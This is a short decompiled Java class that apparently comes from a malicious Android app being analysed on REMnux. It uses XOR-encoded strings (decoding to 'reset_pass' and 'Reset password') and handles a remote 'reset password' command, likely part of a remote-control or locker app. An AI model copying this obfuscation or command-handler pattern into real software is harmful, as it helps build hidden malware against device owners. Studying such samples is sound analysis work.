package com.zjxyxnvvp.nxvxchltf.i;

import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.h;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class l {
    private static short[] $ = {9203, 9188, 9202, 9188, 9205, 9182, 9201, 9184, 9202, 9202, 8785, 8774, 8784, 8790, 8783, 8791, 309, 258, 276, 258, 275, 327, 279, 262, 276, 276, 272, 264, 277, 259};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a() {
        d dVar = d.e;
        p pVar = dVar.c;
        String $2 = $(0, 10, 9089);
        if (pVar.b($2) != null) {
            h.f367a = "";
            h.f368b = false;
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(10, 16, 8739), $(16, 30, 359));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            dVar.c.e($2, jSONObject);
        }
    }
}
